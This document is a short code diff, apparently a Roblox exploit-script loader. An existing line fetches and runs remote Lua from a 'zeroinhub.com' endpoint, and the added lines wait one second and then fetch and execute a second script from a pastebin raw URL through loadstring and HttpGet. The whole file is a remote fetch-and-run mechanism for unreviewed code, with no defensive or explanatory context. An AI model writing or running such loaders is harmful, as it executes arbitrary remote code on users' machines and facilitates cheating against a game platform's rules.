@@ -1,1 +1,5 @@
 loadstring(game:HttpGet("https://zeroinhub.com/api/script"))()
+
+task.wait(1)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/9GXQrNML"))()
